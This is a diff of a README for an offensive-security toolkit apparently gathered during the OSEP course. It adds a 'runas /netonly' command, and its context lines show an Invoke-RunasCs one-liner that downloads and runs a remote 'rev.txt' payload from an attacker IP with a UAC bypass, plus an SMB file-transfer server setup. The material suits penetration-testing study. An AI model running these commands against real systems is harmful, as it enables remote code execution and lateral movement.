@@ -12,6 +12,8 @@ Just a bunch of tools built/gathered along the OSEP course.
 ### <ins>Run command as another user</ins>:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
 
+- `runas.exe /netonly /user:final.com\nina cmd.exe`
+
 ### <ins>Set up SMB server (file transfer)</ins>:
 - `smbserver.py share $(pwd) -smb2support -username amit -password password` 
 
